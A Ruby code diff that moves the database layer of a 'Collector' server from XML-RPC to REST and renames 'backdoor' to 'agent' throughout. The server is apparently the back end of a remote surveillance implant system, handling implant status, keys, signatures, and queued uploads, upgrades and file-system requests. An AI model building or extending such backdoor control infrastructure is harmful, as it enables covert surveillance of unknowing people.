@@ -4,13 +4,11 @@
 
 # relatives
 require_relative 'config.rb'
-require_relative 'db_xmlrpc.rb'
 require_relative 'db_rest.rb'
 require_relative 'db_cache.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
-require 'rcs-common/flatsingleton'
 
 # system
 require 'digest/md5'
@@ -21,44 +19,39 @@ module Collector
 
 class DB
   include Singleton
-  extend FlatSingleton
   include RCS::Tracer
 
-  ACTIVE_BACKDOOR = 0
-  DELETED_BACKDOOR = 1
-  CLOSED_BACKDOOR = 2
-  QUEUED_BACKDOOR = 3
-  NO_SUCH_BACKDOOR = 4
-  UNKNOWN_BACKDOOR = 5
+  ACTIVE_AGENT = 0
+  DELETED_AGENT = 1
+  CLOSED_AGENT = 2
+  QUEUED_AGENT = 3
+  NO_SUCH_AGENT = 4
+  UNKNOWN_AGENT = 5
   
-  attr_reader :backdoor_signature
+  attr_reader :agent_signature
   attr_reader :network_signature
 
   def initialize
     # database address
-    @host = Config.global['DB_ADDRESS'].to_s + ":" + Config.global['DB_PORT'].to_s
-    @host_xmlrpc = Config.global['DB_ADDRESS'].to_s + ":" + (Config.global['DB_PORT'] - 1).to_s
+    @host = Config.instance.global['DB_ADDRESS'].to_s + ":" + Config.instance.global['DB_PORT'].to_s
 
     # the username is an unique identifier for each machine.
     # we use the MD5 of the MAC address
-    #TODO: remove the RSS retro-compatibility
-    @username = Digest::MD5.hexdigest(UUIDTools::UUID.mac_address.to_s) + "RSS"
+    @username = Digest::MD5.hexdigest(UUIDTools::UUID.mac_address.to_s)
     # the password is a signature taken from a file
-    @password = File.read(Config.file('DB_SIGN'))
+    @password = File.read(Config.instance.file('DB_SIGN'))
 
     # status of the db connection
     @available = false
 
-    # global (per customer) backdoor signature
-    @backdoor_signature = nil
+    # global (per customer) agent signature
+    @agent_signature = nil
     # signature for the network elements
     @network_signature = nil
     # class keys
-    @class_keys = {}
+    @factory_keys = {}
     
-    # the current db layer to be used is the XML-RPC protocol
-    # this will be replaced by DB_rest
-    @db = DB_xmlrpc.new @host_xmlrpc
+    # the current db layer REST
     @db_rest = DB_rest.new @host
     
     return @available
@@ -67,7 +60,7 @@ class DB
   def connect!
     trace :info, "Checking the DB connection [#{@host}]..."
     # during the transition we log in to both xml-rpc and rest interfaces
-    if @db.login(@username, @password) and @db_rest.login(@username, @password) then
+    if @db_rest.login(@username, @password) then
       @available = true
       trace :info, "Connected to [#{@host}]"
     else
@@ -78,7 +71,6 @@ class DB
   end
 
   def disconnect!
-    @db.logout
     @db_rest.logout
     @available = false
     trace :info, "Disconnected from [#{@host}]"
@@ -103,15 +95,6 @@ class DB
 
   # wrapper method for all the calls to the underlying layers
   # on error, it will consider the db failed
-  def db_call(method, *args)
-    begin
-      return @db.send method, *args
-    rescue
-      self.connected = false
-      return nil
-    end
-  end
-
   def db_rest_call(method, *args)
     begin
       return @db_rest.send method, *args
@@ -124,17 +107,17 @@ class DB
   def cache_init
     # if the db is available, clear the cache and populate it again
     if @available then
-      # get the global signature (per customer) for all the backdoors
-      bck_sig = db_call :backdoor_signature
-      @backdoor_signature = Digest::MD5.digest bck_sig unless bck_sig.nil?
+      # get the global signature (per customer) for all the agents
+      bck_sig = db_rest_call :agent_signature
+      @agent_signature = Digest::MD5.digest bck_sig unless bck_sig.nil?
 
       # get the network signature to communicate with the network elements
-      net_sig = db_call :network_signature
+      net_sig = db_rest_call :network_signature
       @network_signature = net_sig unless net_sig.nil?
 
-      # get the classkey of every backdoor
-      keys = db_call :class_keys
-      @class_keys = keys unless keys.nil?
+      # get the factory key of every agent
+      keys = db_rest_call :factory_keys
+      @factory_keys = keys unless keys.nil?
 
       # errors while retrieving the data from the db
       return false if bck_sig.nil? or keys.nil? or net_sig.nil?
@@ -145,12 +128,12 @@ class DB
 
       trace :info, "Populating the DB cache..."
       # save in the permanent cache
-      DBCache.backdoor_signature = bck_sig
-      trace :info, "Backdoor signature saved in the DB cache"
+      DBCache.agent_signature = bck_sig
+      trace :info, "Agent signature saved in the DB cache"
       DBCache.network_signature = net_sig
       trace :info, "Network signature saved in the DB cache"
-      DBCache.add_class_keys @class_keys
-      trace :info, "#{@class_keys.length} entries saved in the the DB cache"
+      DBCache.add_factory_keys @factory_keys
+      trace :info, "#{@factory_keys.length} entries saved in the the DB cache"
 
       return true
     end
@@ -161,11 +144,11 @@ class DB
       trace :info, "Loading the DB cache..."
 
       # populate the memory cache from the permanent one
-      @backdoor_signature = Digest::MD5.digest DBCache.backdoor_signature unless DBCache.backdoor_signature.nil?
+      @agent_signature = Digest::MD5.digest DBCache.agent_signature unless DBCache.agent_signature.nil?
       @network_signature = DBCache.network_signature unless DBCache.network_signature.nil?
-      @class_keys = DBCache.class_keys
+      @factory_keys = DBCache.factory_keys
 
-      trace :info, "#{@class_keys.length} entries loaded from DB cache"
+      trace :info, "#{@factory_keys.length} entries loaded from DB cache"
 
       return true
     end
@@ -174,62 +157,60 @@ class DB
     return false
   end
 
-  def update_status(component, ip, status, message, stats)
+  def update_status(component, ip, status, message, stats, nc = false)
     return unless @available
 
     trace :debug, "[#{component}]: #{status} #{message} #{stats}"
-    db_call :update_status, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu]
-    db_rest_call :status_update, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu]
+    db_rest_call :status_update, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu], nc
   end
 
-  def class_key_of(build_id)
+  def factory_key_of(build_id)
     # if we already have it return otherwise we have to ask to the db
-    return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?
+    return Digest::MD5.digest @factory_keys[build_id] unless @factory_keys[build_id].nil?
 
-    trace :debug, "Cache Miss: class key for #{build_id}"
+    trace :debug, "Cache Miss: factory key for #{build_id}"
 
     return nil unless @available
     
-    # ask to the db the class key
-    key = db_call :class_keys, build_id
+    # ask to the db the factory key
+    key = db_rest_call :factory_keys, build_id
 
-    # save the class key in the cache (memory and permanent)
-    if not key.nil? then
-      @class_keys[build_id] = key
+    # save the factory key in the cache (memory and permanent)
+    if not key.nil? and not key.empty? then
+      @factory_keys[build_id] = key
 
       # store it in the permanent cache
       entry = {}
       entry[build_id] = key
-      DBCache.add_class_keys entry
+      DBCache.add_factory_keys entry
 
       # return the key
-      return Digest::MD5.digest @class_keys[build_id]
+      return Digest::MD5.digest @factory_keys[build_id]
     end
 
     # key not found
     return nil
   end
 
-  # returns ALWAYS the status of a backdoor
-  def status_of(build_id, instance_id, subtype)
+  # returns ALWAYS the status of an agent
+  def agent_status(build_id, instance_id, subtype)
     # if the database has gone, reply with a fake response in order for the sync to continue
-    return DB::UNKNOWN_BACKDOOR, 0 unless @available
+    return DB::UNKNOWN_AGENT, 0 unless @available
 
     trace :debug, "Asking the status of [#{build_id}] to the db"
 
-    # ask the database the status of the backdoor
-    status, bid = db_call :status_of, build_id, instance_id, subtype
-
+    # ask the database the status of the agent
+    status, bid = db_rest_call :agent_status, build_id, instance_id, subtype
+    
     # if status is nil, the db down. btw we must not fail, fake the reply
-    return (status.nil?) ? [DB::UNKNOWN_BACKDOOR, 0] : [status, bid]
+    return (status.nil?) ? [DB::UNKNOWN_AGENT, 0] : [status, bid]
   end
 
   def sync_start(session, version, user, device, source, time)
     # database is down, continue
     return unless @available
 
-    # tell the db that the backdoor has synchronized
-    db_call :sync_start, session[:bid], version, user, device, source, time
+    # tell the db that the agent has synchronized
     db_rest_call :sync_start, session, version, user, device, source, time
   end
 
@@ -261,27 +242,29 @@ class DB
     return false unless @available
 
     # retrieve the config from the db
-    cid, config = db_call :new_conf, bid
+    config = db_rest_call :new_conf, bid
 
     # put the config in the cache
-    DBCache.save_conf bid, cid, config unless config.nil?
+    DBCache.save_conf bid, config unless config.nil?
 
     return (config.nil?) ? false : true
   end
 
   def new_conf(bid)
     # retrieve the config from the cache
-    cid, config = DBCache.new_conf bid
+    config = DBCache.new_conf bid
 
     return nil if config.nil?
-
-    # set the status to "sent" in the db
-    db_call :conf_sent, cid if @available
 
     # delete the conf from the cache
     DBCache.del_conf bid
 
     return config
+  end
+
+  def activate_conf(bid)
+    # set the status to "activated" in the db
+    db_rest_call :activate_conf, bid if @available
   end
 
   def new_uploads?(bid)
@@ -292,7 +275,7 @@ class DB
     return false unless @available
 
     # retrieve the upload from the db
-    uploads = db_call :new_uploads, bid
+    uploads = db_rest_call :new_uploads, bid
 
     # put the upload in the cache
     DBCache.save_uploads bid, uploads unless (uploads.nil? or uploads.empty?) 
@@ -307,10 +290,10 @@ class DB
     return nil if upload.nil?
 
     # delete from the db
-    db_call :del_upload, upload[:id] if @available
+    db_rest_call :del_upload, bid, upload[:id] if @available
 
     # delete the upload from the cache
-    DBCache.del_upload upload[:id]
+    DBCache.del_upload bid, upload[:id]
 
     return upload[:upload], left
   end
@@ -325,7 +308,7 @@ class DB
     DBCache.clear_upgrade bid
 
     # retrieve the upgrade from the db
-    upgrade = db_call :new_upgrade, bid
+    upgrade = db_rest_call :new_upgrades, bid
 
     # put the upgrade in the cache
     DBCache.save_upgrade bid, upgrade unless (upgrade.nil? or upgrade.empty?)
@@ -340,11 +323,11 @@ class DB
     return nil if upgrade.nil?
 
     # delete the upgrade from the cache
-    DBCache.del_upgrade upgrade[:id]
+    DBCache.del_upgrade bid, upgrade[:id]
 
     # delete from the db only if all the file have been transmitted
     if left == 0 then
-      db_call :del_upgrade, bid if @available
+      db_rest_call :del_upgrade, bid if @available
     end
 
     return upgrade[:upgrade], left
@@ -358,7 +341,7 @@ class DB
     return false unless @available
 
     # retrieve the downloads from the db
-    downloads = db_call :new_downloads, bid
+    downloads = db_rest_call :new_downloads, bid
 
     # put the download in the cache
     DBCache.save_downloads bid, downloads unless (downloads.nil? or downloads.empty?)
@@ -376,7 +359,7 @@ class DB
     # remove the downloads from the db
     downloads.each_pair do |key, value|
       # delete the entry from the db
-      db_call :del_download, key if @available
+      db_rest_call :del_download, bid, key if @available
       # return only the filename
       down << value
     end
@@ -395,7 +378,7 @@ class DB
     return false unless @available
 
     # retrieve the filesystem from the db
-    filesystems = db_call :new_filesystems, bid
+    filesystems = db_rest_call :new_filesystems, bid
 
     # put the filesystem in the cache
     DBCache.save_filesystems bid, filesystems unless (filesystems.nil? or filesystems.empty?)
@@ -413,7 +396,7 @@ class DB
     # remove the filesystems from the db
     filesystems.each_pair do |key, value|
       # delete the entry from the db
-      db_call :del_filesystem, key if @available
+      db_rest_call :del_filesystem, bid, key if @available
       # return only the {:depth => , :path => } hash
       files << value
     end
@@ -429,7 +412,7 @@ class DB
     return [] unless @available
 
     # ask the db
-    ret = db_call :get_proxies
+    ret = db_rest_call :get_proxies
 
     # return the results or empty on error
     return ret || []
@@ -440,7 +423,7 @@ class DB
     return [] unless @available
 
     # ask the db
-    ret = db_call :get_collectors
+    ret = db_rest_call :get_collectors
 
     # return the results or empty on error
     return ret || []
@@ -448,32 +431,32 @@ class DB
 
   def update_proxy_version(id, version)
     return unless @available
-    db_call :proxy_set_version, id, version
+    db_rest_call :proxy_set_version, id, version
   end
 
   def update_collector_version(id, version)
     return unless @available
-    db_call :collector_set_version, id, version
+    db_rest_call :collector_set_version, id, version
   end
 
   def proxy_config(id)
     return unless @available
-    db_call :proxy_get_config, id
+    db_rest_call :proxy_config, id
   end
 
   def collector_config(id)
     return unless @available
-    db_call :collector_get_config, id
+    db_rest_call :collector_config, id
   end
 
   def proxy_add_log(id, time, type, desc)
     return unless @available
-    db_call :proxy_add_log, id, time, type, desc
+    db_rest_call :proxy_add_log, id, time, type, desc
   end
 
   def collector_add_log(id, time, type, desc)
     return unless @available
-    db_call :collector_add_log, id, time, type, desc
+    db_rest_call :collector_add_log, id, time, type, desc
   end
 
 end #DB
